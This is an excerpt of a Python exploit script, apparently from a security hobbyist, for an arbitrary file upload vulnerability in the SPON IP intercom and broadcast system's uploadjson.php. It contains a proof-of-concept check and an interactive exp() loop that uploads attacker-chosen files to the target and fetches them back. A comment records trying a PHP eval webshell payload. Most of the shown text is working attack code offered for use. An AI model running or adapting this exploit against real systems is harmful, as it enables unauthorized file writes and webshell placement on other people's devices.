 ...
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ...
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                    ...
                                    @author:           🐖sawa🐇
                                    @version:          1.0.0
                                    For:               世邦通信 SPON IP网络对讲广播系统uploadjson.php任意文件上传漏洞
"""
    print(banner)
...
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a 世邦通信 SPON IP网络对讲广播系统uploadjson.php任意文件上传vulnerability")
...
# poc模块
def poc(target):
    payload_url ="/php/uploadjson.php"
    ...
    try:
        ...
        result = target + '/lan/2.php'
        res1 = requests.get(url=result,headers=headers,verify=False,timeout=5)
        if  res.status_code == 200 and '{"res":"1"}' in res.text and res1.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in res1.text :
...
def exp(target):
    ...
    while True:
        ...
        if filename =='q' or content =='q':
            ...
            print("Bye~欢迎下次光临")
            break
        data = f"jsondata[filename]={filename}&jsondata[data]={content}"
        try:
            res = requests.post(url=target+'/php/uploadjson.php',headers=headers,data=data,timeout=5,verify=False)
            # match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
            result = f"{target}/lan/{filename}"
            res1 = requests.get(url=result,headers=headers,verify=False,timeout=5)
            if  res.status_code == 200 and res1.status_code == 200 :#上传<?php phpinfo();@eval($_POST['s']);?> 也没有什么卵用 一访问就404 库库杀 只有普通安全的可回显 过分
